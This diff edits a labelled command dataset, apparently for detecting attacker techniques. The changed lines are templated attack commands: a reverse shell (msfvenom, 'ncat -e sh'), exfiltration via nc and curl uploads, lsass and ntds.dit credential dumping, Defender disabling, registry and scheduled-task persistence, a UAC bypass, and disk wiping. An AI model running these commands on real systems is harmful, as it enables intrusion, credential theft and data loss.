@@ -25,36 +25,30 @@
 1	net user /domain
 1	get-localgroupmember -group Users
 1	whoami
-1	nltest /domain_trusts
-1	nltest /dclist
-1	whoami /all
-0	powershell -c "scp ${username}@${ip_address}:${destination_file_path} ${source_file_path}"
-0	zip archive.zip ${source_file_path}
-0	copy ${shadow_copy_path}\windows\ntds\ntds.dit ${local_file_path}
-0	.\VGAuthService.exe ${VGAuthService.dll_path},VoidFunc
-0	cscript "${jscript}"
-0	cmd.exe /c "${command_to_execute}"
-0	Add-MpPreference -ExclusionPath "${excluded}"
-0	cmd.exe /c "${command_to_execute}" > ${local_file_path}
-0	powershell -c "sync -avz ${source_file_path} ${destination_file_path}"
-0	reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend" /v 1 /d "${command_to_execute}"
-0	nc -l ${ip_address} ${port}
-0	taskkill.exe /f /im ${process_name}
-0	powershell -c "scp ${username}@${ip_address}:${destination_file_path} ${source_file_path}"
-0	cmd.exe /c "psexec \\${ip_address} -i -u ${username} -p ${password} ${command_to_execute}"
-0	cmd.exe /c "psexec \\${ip_address} -i -u ${username} -p ${password} ${command_to_execute}"
-0	echo ${email_content} | mail -s ${email_subject} ${username}@${domain}
-0	tar -cvf archive.tar ${source_directory}
-0	powershell -c "wmic /node:"${ip_address}" shadowcopy call create Volume=C:"
-0	powershell -c "PsExec64.exe \\${ip_address} -s ${command_to_execute}"
-0	powershell -c "echo y | plink.exe ${username}@${ip_address} -pw ${password} -2 -4 -T -N -C -R ${ip_address}:${remote_port}:127.0.0.1:${local_port}"
-0	robocopy ${source_directory} ${destination_directory} /e
-0	plink.exe -ssh -l ${username} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port} ${ip_address}
-0	scp ${username}@${ip_address}:${source_file_path} ${destination_file_path}
-0	echo ${email_content} | mail -s ${email_subject} ${username}@${domain}
+0	msfvenom -p linux/x64/shell_reverse_tcp LHOST=${ip_address} LPORT=${port} -f elf -o reverse.elf
 0	cmd.exe /c "copy ${source_file_path} ${destination_file_path}"
-0	rar a archive.rar ${source_directory}
-0	curl -X POST http://${ip_address}/upload -H -F "files=@${source_file_path}"
-0	vssadmin create shadow /for=C:
-0	red add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce" /V "Atomic Red Team" /t REG_SZ /f /d "${command_to_execute}"
-0	reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v ${value_name} /t REG_DWORD /d ${value}
+0	powershell -c "cipher.exe /w:C:"
+0	powershell -c "echo ${email_content} | mail -s ${email_subject} ${username}@${domain}"
+0	gpg.exe -c ${source_file_path}
+0	schtasks /create /tn win32times /sc onstart /ru system /tr "${command_to_execute}"
+0	powershell -c "bitsadmin.exe /transfer download /Priority HIGH ${source_file_path} ${destination_file_path}"
+0	nc -l ${ip_address} ${port}
+0	zip -er archive.zip ${source_directory}
+0	psexec \\${ip_address} -i -u ${username} -p ${password} ${command_to_execute}
+0	zip -r archive.zip ${source_directory}
+0	plink.exe ${username}@${ip_address} -pw ${password} -2 -4 -T -N -C -R ${ip_address}:${remote_port}:127.0.0.1:${local_port}
+0	red add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Atomic Red Team" /t REG_SZ /F /D "${command_to_execute}"
+0	Set-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1
+0	ncat ${ip_address} ${port} -e sh
+0	sc.exe start ${service_name}
+0	scp -r ${source_directory} ${username}@${ip_address}:${destination_directory}
+0	sc.exe stop ${service_name}
+0	cat ${source_file_path} | ssh ${username}@${ip_address} 'cat > ${destination_file_path}'
+0	New-Item "HKCU:\software\classes\mscfile\shell\open\command" -Force; Set-ItemProperty "HKCU:\software\classes\mscfile\shell\open\command" -Name "(default)" -Value "${command_to_execute}" -Force
+0	cat email.txt | mpack -s ${email_subject} ${username}@${domain}
+0	curl ${source_file_path} -o $ ${destination_file_path}
+0	wscript "${jscript}" > ${local_file_path}
+0	powershell -c "psexec \\${ip_address} -i -u ${username} -p ${password} ${command_to_execute} -s"
+0	cmd.exe /c "curl ${source_file_path} -o $ ${destination_file_path}"
+0	cat ${source_file_path} | nc -vn ${ip_address} ${port}
+0	nanodump.x64.exe --silent-process-exit lsassdump.dmp
